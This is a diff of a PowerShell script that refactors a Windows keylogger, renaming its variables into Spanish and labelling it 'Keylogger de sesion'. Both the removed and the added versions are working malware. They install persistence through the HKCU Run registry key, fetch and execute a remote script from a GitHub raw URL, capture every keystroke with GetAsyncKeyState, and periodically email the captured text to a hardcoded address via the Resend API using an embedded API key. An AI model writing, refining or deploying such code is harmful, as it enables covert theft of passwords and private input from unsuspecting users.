@@ -1,47 +1,64 @@
-$u='https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1'
-$k='re_31Pa1SbW_3EL3zkFdqDgAqpFQnmCQ59im'
-$t='adriancorreagutierrez@gmail.com'
-$m=5
-$n='WinSvcHost'
+# Keylogger de sesion
+$ApiKey  = 're_fBrqT2CZ_3mgybtPDjLw7cakGNR4a1z3j'
+$Destino = 'adriancorreagutierrez@gmail.com'
+$Url     = 'https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/main/k.ps1'
+$Minutos = 1
+$Nombre  = 'WinSvcHost'
 
-$mx=New-Object System.Threading.Mutex($false,"Local\$n")
-if(-not $mx.WaitOne(0)){exit}
+$soloUno = New-Object System.Threading.Mutex($false, "Local\$Nombre")
+if (-not $soloUno.WaitOne(0)) { exit }
 
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $n -Value "powershell -W Hidden -c iex(irm '$u')" -Force
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
+    -Name $Nombre -Value "powershell -W Hidden -c iex(irm '$Url')" -Force
 
 Add-Type -MemberDefinition @'
 [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
 [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] k);
 [DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int ToUnicode(uint vk, uint sc, byte[] k, [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst=64)] System.Text.StringBuilder sb, int n, uint f);
-'@ -Name Wk7 -Namespace Qz
+'@ -Name Teclado -Namespace Win
 
-$sb=New-Object System.Text.StringBuilder 64
-$ks=New-Object byte[] 256
-$dn=@{}
-$sp=@{8='[BKSP]';9='[TAB]';13="`n";27='[ESC]';46='[DEL]';37='[<]';38='[^]';39='[>]';40='[v]'}
+$buffer   = New-Object System.Text.StringBuilder 64
+$estado   = New-Object byte[] 256
+$pulsadas = @{}
+$especial = @{ 8='[BKSP]'; 9='[TAB]'; 13="`n"; 27='[ESC]'; 46='[DEL]'; 37='[<]'; 38='[^]'; 39='[>]'; 40='[v]' }
 
-$t0=Get-Date
-$buf=''
+$ultimoEnvio = Get-Date
+$acumulado   = ''
 
-while($true){
-  for($i=8;$i -lt 255;$i++){
-    if([Qz.Wk7]::GetAsyncKeyState($i) -band 0x8000){
-      if(-not $dn[$i]){
-        $dn[$i]=$true
-        if($sp.ContainsKey($i)){ $ch=$sp[$i] }
-        else{
-          [void][Qz.Wk7]::GetKeyboardState($ks)
-          $r=[Qz.Wk7]::ToUnicode([uint32]$i,0,$ks,$sb,64,0)
-          $ch=if($r -ge 1){$sb.ToString()}else{''}
+while ($true) {
+    for ($tecla = 8; $tecla -lt 255; $tecla++) {
+        if ([Win.Teclado]::GetAsyncKeyState($tecla) -band 0x8000) {
+            if (-not $pulsadas[$tecla]) {
+                $pulsadas[$tecla] = $true
+                if ($especial.ContainsKey($tecla)) {
+                    $caracter = $especial[$tecla]
+                } else {
+                    [void][Win.Teclado]::GetKeyboardState($estado)
+                    $resultado = [Win.Teclado]::ToUnicode([uint32]$tecla, 0, $estado, $buffer, 64, 0)
+                    $caracter = if ($resultado -ge 1) { $buffer.ToString() } else { '' }
+                }
+                if ($caracter) { $acumulado += $caracter }
+            }
+        } else {
+            $pulsadas[$tecla] = $false
         }
-        if($ch){$buf+=$ch}
-      }
-    } else { $dn[$i]=$false }
-  }
-  if(((Get-Date)-$t0).TotalMinutes -ge $m -and $buf.Length -gt 0){
-    $j='{"from":"onboarding@resend.dev","to":"'+$t+'","subject":"'+$env:COMPUTERNAME+'","text":'+(ConvertTo-Json $buf)+'}'
-    try{ iwr 'https://api.resend.com/emails' -Method Post -Headers @{Authorization="Bearer $k"} -ContentType 'application/json' -Body $j -UseBasicParsing -TimeoutSec 20 | Out-Null }catch{}
-    $buf=''; $t0=Get-Date
-  }
-  Start-Sleep -Milliseconds 12
+    }
+
+    if (((Get-Date) - $ultimoEnvio).TotalMinutes -ge $Minutos -and $acumulado.Length -gt 0) {
+        $cuerpo = @{
+            from    = 'onboarding@resend.dev'
+            to      = $Destino
+            subject = $env:COMPUTERNAME
+            text    = $acumulado
+        } | ConvertTo-Json -Compress
+        try {
+            Invoke-RestMethod 'https://api.resend.com/emails' -Method Post `
+                -Headers @{ Authorization = "Bearer $ApiKey" } `
+                -ContentType 'application/json' -Body $cuerpo -TimeoutSec 20 | Out-Null
+        } catch {}
+        $acumulado   = ''
+        $ultimoEnvio = Get-Date
+    }
+
+    Start-Sleep -Milliseconds 12
 }
